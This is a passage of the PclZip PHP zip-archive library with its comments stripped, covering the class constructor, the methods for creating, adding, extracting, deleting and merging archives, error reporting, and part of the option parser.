define( 'PCLZIP_OPT_TEMP_FILE_ON', 77021 );
define( 'PCLZIP_OPT_TEMP_FILE_OFF', 77022 );

define( 'PCLZIP_ATT_FILE_NAME', 79001 );
define( 'PCLZIP_ATT_FILE_NEW_SHORT_NAME', 79002 );
define( 'PCLZIP_ATT_FILE_NEW_FULL_NAME', 79003 );
define( 'PCLZIP_ATT_FILE_MTIME', 79004 );
define( 'PCLZIP_ATT_FILE_CONTENT', 79005 );
define( 'PCLZIP_ATT_FILE_COMMENT', 79006 );

define( 'PCLZIP_CB_PRE_EXTRACT', 78001 );
define( 'PCLZIP_CB_POST_EXTRACT', 78002 );
define( 'PCLZIP_CB_PRE_ADD', 78003 );
define( 'PCLZIP_CB_POST_ADD', 78004 );

class PclZip
{
  var $zipname = '';

  var $zip_fd = 0;

  var $error_code = 1;
  var $error_string = '';
  
  var $magic_quotes_status;

function PclZip($p_zipname)
{

  if (!function_exists('gzopen'))
  {
    die('Abort '.basename(__FILE__).' : Missing zlib extensions');
  }

  $this->zipname = $p_zipname;
  $this->zip_fd = 0;
  $this->magic_quotes_status = -1;

  return;
}

function create($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
                                           ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                       "Invalid number / type of arguments");
        return 0;
      }
    }
  }
  
  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      if ($v_string != '') {
        $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
      }
      else {
      }
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privCreate($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function add($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_ADD_COMMENT => 'optional',
                                                 PCLZIP_OPT_PREPEND_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
											   ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_add_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }

  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type '".gettype($p_filelist)."' for p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privAdd($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function listContent()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $p_list = array();
  if (($v_result = $this->privList($p_list)) != 1)
  {
    unset($p_list);
    return(0);
  }

  return $p_list;
}

function extract()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();
  $v_path = '';
  $v_remove_path = "";
  $v_remove_all_path = false;

  $v_size = func_num_args();

  $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

  if ($v_size > 0) {
    $v_arg_list = func_get_args();

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                 PCLZIP_CB_POST_EXTRACT => 'optional',
                                                 PCLZIP_OPT_SET_CHMOD => 'optional',
                                                 PCLZIP_OPT_BY_NAME => 'optional',
                                                 PCLZIP_OPT_BY_EREG => 'optional',
                                                 PCLZIP_OPT_BY_PREG => 'optional',
                                                 PCLZIP_OPT_BY_INDEX => 'optional',
                                                 PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                 PCLZIP_OPT_EXTRACT_IN_OUTPUT => 'optional',
                                                 PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                 ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                 ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
											    ));
      if ($v_result != 1) {
        return 0;
      }

      if (isset($v_options[PCLZIP_OPT_PATH])) {
        $v_path = $v_options[PCLZIP_OPT_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
        $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
        $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
        if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
          $v_path .= '/';
        }
        $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
      }
    }

    else {

      $v_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_remove_path = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }

  $this->privOptionDefaultThreshold($v_options);


  $p_list = array();
  $v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path,
                                     $v_remove_all_path, $v_options);
  if ($v_result < 1) {
    unset($p_list);
    return(0);
  }

  return $p_list;
}



function extractByIndex($p_index)
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();
  $v_path = '';
  $v_remove_path = "";
  $v_remove_all_path = false;

  $v_size = func_num_args();

  $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                 PCLZIP_CB_POST_EXTRACT => 'optional',
                                                 PCLZIP_OPT_SET_CHMOD => 'optional',
                                                 PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                 ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                 ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
											   ));
      if ($v_result != 1) {
        return 0;
      }

      if (isset($v_options[PCLZIP_OPT_PATH])) {
        $v_path = $v_options[PCLZIP_OPT_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
        $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
        $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
        if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
          $v_path .= '/';
        }
        $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
      }
      if (!isset($v_options[PCLZIP_OPT_EXTRACT_AS_STRING])) {
        $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;
      }
      else {
      }
    }

    else {

      $v_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_remove_path = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }


  $v_arg_trick = array (PCLZIP_OPT_BY_INDEX, $p_index);
  $v_options_trick = array();
  $v_result = $this->privParseOptions($v_arg_trick, sizeof($v_arg_trick), $v_options_trick,
                                      array (PCLZIP_OPT_BY_INDEX => 'optional' ));
  if ($v_result != 1) {
      return 0;
  }
  $v_options[PCLZIP_OPT_BY_INDEX] = $v_options_trick[PCLZIP_OPT_BY_INDEX];

  $this->privOptionDefaultThreshold($v_options);

  if (($v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path, $v_remove_all_path, $v_options)) < 1) {
      return(0);
  }

  return $p_list;
}

function delete()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();

  $v_size = func_num_args();

  if ($v_size > 0) {
    $v_arg_list = func_get_args();

    $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                      array (PCLZIP_OPT_BY_NAME => 'optional',
                                             PCLZIP_OPT_BY_EREG => 'optional',
                                             PCLZIP_OPT_BY_PREG => 'optional',
                                             PCLZIP_OPT_BY_INDEX => 'optional' ));
    if ($v_result != 1) {
        return 0;
    }
  }

  $this->privDisableMagicQuotes();

  $v_list = array();
  if (($v_result = $this->privDeleteByRule($v_list, $v_options)) != 1) {
    $this->privSwapBackMagicQuotes();
    unset($v_list);
    return(0);
  }

  $this->privSwapBackMagicQuotes();

  return $v_list;
}

function deleteByIndex($p_index)
{
  
  $p_list = $this->delete(PCLZIP_OPT_BY_INDEX, $p_index);

  return $p_list;
}

function properties()
{

  $this->privErrorReset();

  $this->privDisableMagicQuotes();

  if (!$this->privCheckFormat()) {
    $this->privSwapBackMagicQuotes();
    return(0);
  }

  $v_prop = array();
  $v_prop['comment'] = '';
  $v_prop['nb'] = 0;
  $v_prop['status'] = 'not_exist';

  if (@is_file($this->zipname))
  {
    if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
    {
      $this->privSwapBackMagicQuotes();
      
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

      return 0;
    }

    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      return 0;
    }

    $this->privCloseFd();

    $v_prop['comment'] = $v_central_dir['comment'];
    $v_prop['nb'] = $v_central_dir['entries'];
    $v_prop['status'] = 'ok';
  }

  $this->privSwapBackMagicQuotes();

  return $v_prop;
}

function duplicate($p_archive)
{
  $v_result = 1;

  $this->privErrorReset();

  if ((is_object($p_archive)) && (get_class($p_archive) == 'pclzip'))
  {

    $v_result = $this->privDuplicate($p_archive->zipname);
  }

  else if (is_string($p_archive))
  {

    if (!is_file($p_archive)) {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "No file with filename '".$p_archive."'");
      $v_result = PCLZIP_ERR_MISSING_FILE;
    }
    else {
      $v_result = $this->privDuplicate($p_archive);
    }
  }

  else
  {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
    $v_result = PCLZIP_ERR_INVALID_PARAMETER;
  }

  return $v_result;
}

function merge($p_archive_to_add)
{
  $v_result = 1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  if ((is_object($p_archive_to_add)) && (get_class($p_archive_to_add) == 'pclzip'))
  {

    $v_result = $this->privMerge($p_archive_to_add);
  }

  else if (is_string($p_archive_to_add))
  {

    $v_object_archive = new PclZip($p_archive_to_add);

    $v_result = $this->privMerge($v_object_archive);
  }

  else
  {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
    $v_result = PCLZIP_ERR_INVALID_PARAMETER;
  }

  return $v_result;
}



function errorCode()
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    return(PclErrorCode());
  }
  else {
    return($this->error_code);
  }
}

function errorName($p_with_code=false)
{
  $v_name = array ( PCLZIP_ERR_NO_ERROR => 'PCLZIP_ERR_NO_ERROR',
                    PCLZIP_ERR_WRITE_OPEN_FAIL => 'PCLZIP_ERR_WRITE_OPEN_FAIL',
                    PCLZIP_ERR_READ_OPEN_FAIL => 'PCLZIP_ERR_READ_OPEN_FAIL',
                    PCLZIP_ERR_INVALID_PARAMETER => 'PCLZIP_ERR_INVALID_PARAMETER',
                    PCLZIP_ERR_MISSING_FILE => 'PCLZIP_ERR_MISSING_FILE',
                    PCLZIP_ERR_FILENAME_TOO_LONG => 'PCLZIP_ERR_FILENAME_TOO_LONG',
                    PCLZIP_ERR_INVALID_ZIP => 'PCLZIP_ERR_INVALID_ZIP',
                    PCLZIP_ERR_BAD_EXTRACTED_FILE => 'PCLZIP_ERR_BAD_EXTRACTED_FILE',
                    PCLZIP_ERR_DIR_CREATE_FAIL => 'PCLZIP_ERR_DIR_CREATE_FAIL',
                    PCLZIP_ERR_BAD_EXTENSION => 'PCLZIP_ERR_BAD_EXTENSION',
                    PCLZIP_ERR_BAD_FORMAT => 'PCLZIP_ERR_BAD_FORMAT',
                    PCLZIP_ERR_DELETE_FILE_FAIL => 'PCLZIP_ERR_DELETE_FILE_FAIL',
                    PCLZIP_ERR_RENAME_FILE_FAIL => 'PCLZIP_ERR_RENAME_FILE_FAIL',
                    PCLZIP_ERR_BAD_CHECKSUM => 'PCLZIP_ERR_BAD_CHECKSUM',
                    PCLZIP_ERR_INVALID_ARCHIVE_ZIP => 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP',
                    PCLZIP_ERR_MISSING_OPTION_VALUE => 'PCLZIP_ERR_MISSING_OPTION_VALUE',
                    PCLZIP_ERR_INVALID_OPTION_VALUE => 'PCLZIP_ERR_INVALID_OPTION_VALUE',
                    PCLZIP_ERR_UNSUPPORTED_COMPRESSION => 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION',
                    PCLZIP_ERR_UNSUPPORTED_ENCRYPTION => 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION'
                    ,PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE => 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE'
                    ,PCLZIP_ERR_DIRECTORY_RESTRICTION => 'PCLZIP_ERR_DIRECTORY_RESTRICTION'
                  );

  if (isset($v_name[$this->error_code])) {
    $v_value = $v_name[$this->error_code];
  }
  else {
    $v_value = 'NoName';
  }

  if ($p_with_code) {
    return($v_value.' ('.$this->error_code.')');
  }
  else {
    return($v_value);
  }
}

function errorInfo($p_full=false)
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    return(PclErrorString());
  }
  else {
    if ($p_full) {
      return($this->errorName(true)." : ".$this->error_string);
    }
    else {
      return($this->error_string." [code ".$this->error_code."]");
    }
  }
}





function privCheckFormat($p_level=0)
{
  $v_result = true;

  clearstatcache();

  $this->privErrorReset();

  if (!is_file($this->zipname)) {
    PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "Missing archive file '".$this->zipname."'");
    return(false);
  }

  if (!is_readable($this->zipname)) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to read archive '".$this->zipname."'");
    return(false);
  }




  return $v_result;
}

function privParseOptions(&$p_options_list, $p_size, &$v_result_list, $v_requested_options=false)
{
  $v_result=1;
  
  $i=0;
  while ($i<$p_size) {

    if (!isset($v_requested_options[$p_options_list[$i]])) {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid optional parameter '".$p_options_list[$i]."' for this method");

      return PclZip::errorCode();
    }

    switch ($p_options_list[$i]) {
      case PCLZIP_OPT_PATH :
      case PCLZIP_OPT_REMOVE_PATH :
      case PCLZIP_OPT_ADD_PATH :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
        $i++;
      break;

      case PCLZIP_OPT_TEMP_FILE_THRESHOLD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");
          return PclZip::errorCode();
        }
        
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
          return PclZip::errorCode();
        }
        
        $v_value = $p_options_list[$i+1];
        if ((!is_integer($v_value)) || ($v_value<0)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Integer expected for option '".PclZipUtilOptionText($p_options_list[$i])."'");
          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $v_value*1048576;
        $i++;
      break;

      case PCLZIP_OPT_TEMP_FILE_ON :
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
          return PclZip::errorCode();
        }
        
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_TEMP_FILE_OFF :
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_ON])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_ON'");
          return PclZip::errorCode();
        }
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_THRESHOLD])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_THRESHOLD'");
          return PclZip::errorCode();
        }
        
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_EXTRACT_DIR_RESTRICTION :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (   is_string($p_options_list[$i+1])
            && ($p_options_list[$i+1] != '')) {
          $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
          $i++;
        }
        else {
        }
      break;

      case PCLZIP_OPT_BY_NAME :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]][0] = $p_options_list[$i+1];
        }
        else if (is_array($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_BY_EREG :
        $p_options_list[$i] = PCLZIP_OPT_BY_PREG;
      case PCLZIP_OPT_BY_PREG :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_COMMENT :
      case PCLZIP_OPT_ADD_COMMENT :
      case PCLZIP_OPT_PREPEND_COMMENT :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE,
		                     "Missing parameter value for option '"
							 .PclZipUtilOptionText($p_options_list[$i])
							 ."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE,
		                     "Wrong parameter value for option '"
							 .PclZipUtilOptionText($p_options_list[$i])
							 ."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_BY_INDEX :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_work_list = array();
        if (is_string($p_options_list[$i+1])) {

            $p_options_list[$i+1] = strtr($p_options_list[$i+1], ' ', '');

            $v_work_list = explode(",", $p_options_list[$i+1]);
        }
        else if (is_integer($p_options_list[$i+1])) {
            $v_work_list[0] = $p_options_list[$i+1].'-'.$p_options_list[$i+1];
        }
        else if (is_array($p_options_list[$i+1])) {
            $v_work_list = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Value must be integer, string or array for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        
        $v_sort_flag=false;
        $v_sort_value=0;
        for ($j=0; $j<sizeof($v_work_list); $j++) {
            $v_item_list = explode("-", $v_work_list[$j]);
            $v_size_item_list = sizeof($v_item_list);
            
            
            if ($v_size_item_list == 1) {
                $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[0];
            }
            elseif ($v_size_item_list == 2) {
                $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[1];
            }
            else {
                PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Too many values in index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                return PclZip::errorCode();
            }


            if ($v_result_list[$p_options_list[$i]][$j]['start'] < $v_sort_value) {
                $v_sort_flag=true;

                PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Invalid order of index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                return PclZip::errorCode();
            }
            $v_sort_value = $v_result_list[$p_options_list[$i]][$j]['start'];
        }
        
        if ($v_sort_flag) {
        }

        $i++;
      break;

      case PCLZIP_OPT_REMOVE_ALL_PATH :
      case PCLZIP_OPT_EXTRACT_AS_STRING :
      case PCLZIP_OPT_NO_COMPRESSION :
      case PCLZIP_OPT_EXTRACT_IN_OUTPUT :
      case PCLZIP_OPT_REPLACE_NEWER :
      case PCLZIP_OPT_STOP_ON_ERROR :
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_SET_CHMOD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        $i++;
      break;

      case PCLZIP_CB_PRE_EXTRACT :
      case PCLZIP_CB_POST_EXTRACT :
      case PCLZIP_CB_PRE_ADD :
      case PCLZIP_CB_POST_ADD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_function_name = $p_options_list[$i+1];

        if (!function_exists($v_function_name)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Function '".$v_function_name."()' is not an existing function for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $v_function_name;
        $i++;
      break;

      default :
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
